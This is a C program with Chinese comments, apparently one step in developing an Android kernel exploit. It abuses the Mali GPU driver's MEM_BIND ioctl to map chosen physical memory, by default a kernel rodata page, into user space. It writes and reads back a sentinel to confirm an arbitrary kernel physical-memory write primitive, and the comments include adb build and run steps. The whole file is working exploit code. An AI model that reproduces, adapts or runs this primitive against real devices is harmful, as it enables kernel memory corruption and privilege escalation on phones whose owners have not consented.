/*
 * kort_write_probe2.c - 正确测试 "CPU 是否能通过 BIND+mmap 写物理内存"
 *
 * 之前 kort_write_probe 用 mmap(PROT_WRITE) 失败 -> 其实是驱动拒绝"只写"映射。
 * kort_phys_read2 用的是 mmap(PROT_READ|PROT_WRITE) 且成功读取。
 * 本程序做权威验证:
 *   1. BIND PA -> VA1, mmap(PROT_READ|PROT_WRITE) 拿到映射 m1
 *   2. 读出原始 4 字节, 写 sentinel 0x1337C0DE
 *   3. cacheflush(m1) 把写推到 DRAM
 *   4. BIND 同一 PA -> VA2(不同 VA), mmap(PROT_READ) 拿到 m2, cacheflush(m2) 失效
 *   5. 读 m2[0]: 若 == sentinel => CPU 写真实落地物理内存 => 不需要 PP job!
 *   6. 还原原始 4 字节 (避免破坏内核)
 *
 * 默认用 banner rodata 页 0x01DC0000 (只被读取, 不执行, 可安全还原)。
 * 用法: armv7a-linux-androideabi24-clang kort_write_probe2.c -o kort_write_probe2 -static
 *       adb push kort_write_probe2 /data/local/tmp/ && adb shell chmod 755 /data/local/tmp/kort_write_probe2
 *       adb shell /data/local/tmp/kort_write_probe2
 *       adb shell /data/local/tmp/kort_write_probe2 -t 0x01080000
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <signal.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

#define MALI_IOC_MEM_BIND   0xC0288302
#define PAGE_SIZE 4096

static volatile int g_to = 0;
static void alh(int s) { g_to = 1; }
static int tio(int fd, unsigned int cmd, void *buf, int t) {
    alarm(t); g_to = 0;
    int r = ioctl(fd, cmd, buf);
    int e = errno; alarm(0);
    if (g_to) return -999;
    return r == 0 ? 0 : -e;
}

/* 修正布局: ctx@0 vaddr@8 size@12 flags@16 pad@20 phys@24 rights@28 */
static int bind_phys(int fd, uint32_t phys, uint32_t gpu_va, uint32_t size) {
    uint8_t raw[40];
    memset(raw, 0, sizeof(raw));
    uint64_t ctx = 0;
    uint32_t vaddr = gpu_va, sz = size, fl = 0x800,
             pa = phys, rights = 0x37;
    memcpy(raw + 0,  &ctx, 8);
    memcpy(raw + 8,  &vaddr, 4);
    memcpy(raw + 12, &sz, 4);
    memcpy(raw + 16, &fl, 4);
    memcpy(raw + 24, &pa, 4);
    memcpy(raw + 28, &rights, 4);
    return tio(fd, MALI_IOC_MEM_BIND, raw, 3);
}

int main(int argc, char **argv) {
    struct sigaction sa; memset(&sa, 0, sizeof(sa));
    sa.sa_handler = alh; sigaction(SIGALRM, &sa, NULL);
    setvbuf(stdout, NULL, _IONBF, 0);

    uint32_t pa = (argc > 2) ? (uint32_t)strtoul(argv[2], 0, 0) : 0x01DC0000u;
    printf("[*] kort_write_probe2: CPU-write test on phys 0x%08x\n", pa);
    printf("[*] (banner rodata page, self-restoring)\n");

    int fd = open("/dev/mali", O_RDWR);
    if (fd < 0) { perror("open"); return 1; }

    const uint32_t VA1 = 0x41000000u, VA2 = 0x42000000u;
    const uint32_t SENT = 0x1337C0DEu;

    if (bind_phys(fd, pa, VA1, PAGE_SIZE) != 0) { printf("[-] BIND VA1 fail\n"); close(fd); return 1; }
    if (bind_phys(fd, pa, VA2, PAGE_SIZE) != 0) { printf("[-] BIND VA2 fail\n"); close(fd); return 1; }
    printf("[+] BIND VA1=0x%x VA2=0x%x OK\n", VA1, VA2);

    void *m1 = mmap(NULL, PAGE_SIZE, PROT_READ|PROT_WRITE, MAP_SHARED, fd, VA1);
    if (m1 == MAP_FAILED) { printf("[-] mmap VA1: %s\n", strerror(errno)); close(fd); return 1; }
    void *m2 = mmap(NULL, PAGE_SIZE, PROT_READ, MAP_SHARED, fd, VA2);
    if (m2 == MAP_FAILED) { printf("[-] mmap VA2: %s\n", strerror(errno)); munmap(m1,PAGE_SIZE); close(fd); return 1; }
    printf("[+] mmap OK m1=%p m2=%p\n", m1, m2);

    volatile uint32_t *w = (volatile uint32_t*)m1;
    volatile uint32_t *r = (volatile uint32_t*)m2;
    uint32_t orig = w[0];
    printf("[*] orig[0]=0x%08x  -> write sentinel 0x%08x to m1\n", orig, SENT);

    w[0] = SENT;
    __builtin___clear_cache((char*)m1, (char*)m1 + 64);   /* push to DRAM */
    /* 小延迟让总线写完 */
    for (volatile int i = 0; i < 1000; i++);

    __builtin___clear_cache((char*)m2, (char*)m2 + 64);   /* invalidate m2 cache */
    uint32_t back = r[0];
    printf("[*] readback via m2[0]=0x%08x\n", back);

    if (back == SENT) {
        printf("\n[+] ==========================================\n");
        printf("[+] CPU WRITE CONFIRMED via BIND+mmap(RDWR)!\n");
        printf("[+] 无需 PP job, 直接 memcpy 改内核物理页即可\n");
        printf("[+] ==========================================\n");
    } else {
        printf("\n[-] back=0x%08x != sentinel -> CPU 写未落地\n", back);
        printf("[-] 仍需要 PP job (Writeback DMA) 走写原语\n");
    }

    /* 还原原始 4 字节 */
    w[0] = orig;
    __builtin___clear_cache((char*)m1, (char*)m1 + 64);
    printf("[*] restored orig 0x%08x\n", orig);

    munmap(m1, PAGE_SIZE); munmap(m2, PAGE_SIZE);
    close(fd);
    return 0;
}
